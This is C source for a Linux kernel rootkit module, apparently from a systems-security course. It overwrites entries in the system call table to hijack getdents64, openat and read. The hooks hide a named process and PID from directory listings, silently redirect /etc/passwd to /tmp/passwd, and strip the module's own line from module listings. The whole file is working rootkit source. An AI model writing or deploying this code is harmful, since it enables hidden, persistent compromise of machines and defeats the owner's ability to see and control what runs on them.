#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>  // for system call constants
#include <linux/dirent.h>
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>

#define PREFIX "sneaky_process"

static char *SNEAKY_PID = "";
module_param(SNEAKY_PID, charp, 0);
MODULE_PARM_DESC(SNEAKY_PID, "PID of the sneaky process");

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr) {
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// Helper function used in sneaky getdents64 to check if the process is sneaky
// and replace it
bool is_sneaky_process(struct linux_dirent64 *cur) {
  return (strcmp(cur->d_name, PREFIX) == 0) ||
         (strcmp(cur->d_name, SNEAKY_PID) == 0);
}

int remove_entry(struct linux_dirent64 *dirp, struct linux_dirent64 *cur,
                 int total_len) {
  char *next = (char *)cur + cur->d_reclen;
  int len = (char *)dirp + total_len - (char *)next;
  total_len -= cur->d_reclen;
  memmove(cur, next, len);
  return total_len;
}

// 1. Function pointer will be used to save address of the original 'openat'
// syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_read)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 *cur_entry = dirp;
  int scan = 0;
  int total = (*original_getdents64)(regs);
  if (total <= 0) {
    return total;
  }

  while (scan < total) {
    if (is_sneaky_process(cur_entry)) {
      total = remove_entry(dirp, cur_entry, total);
      continue;
    }
    scan += cur_entry->d_reclen;
    cur_entry =
        (struct linux_dirent64 *)((char *)cur_entry + cur_entry->d_reclen);
  }
  return total;
}

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
  // Implement the sneaky part here
  const char *pathname = (const char *)regs->si;
  if (strcmp(pathname, "/etc/passwd") == 0) {
    const char *sneaky_path = "/tmp/passwd";
    copy_to_user((char *)pathname, sneaky_path, strlen(sneaky_path) + 1);
  }
  return (*original_openat)(regs);
}

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
  char *buf = (char *)regs->si;
  char *sneaky_mod_line = strstr(buf, "sneaky_mod ");

  ssize_t total = (ssize_t)(*original_read)(regs);
  if (total <= 0) {
    return total;
  }

  if (sneaky_mod_line != NULL) {
    char *next_module_line = strchr(sneaky_mod_line, '\n') + 1;
    memmove(sneaky_mod_line, next_module_line, buf + total - next_module_line);
    total -= (ssize_t)(next_module_line - sneaky_mod_line);
  }

  return total;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_openat = (void *)sys_call_table[__NR_openat];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");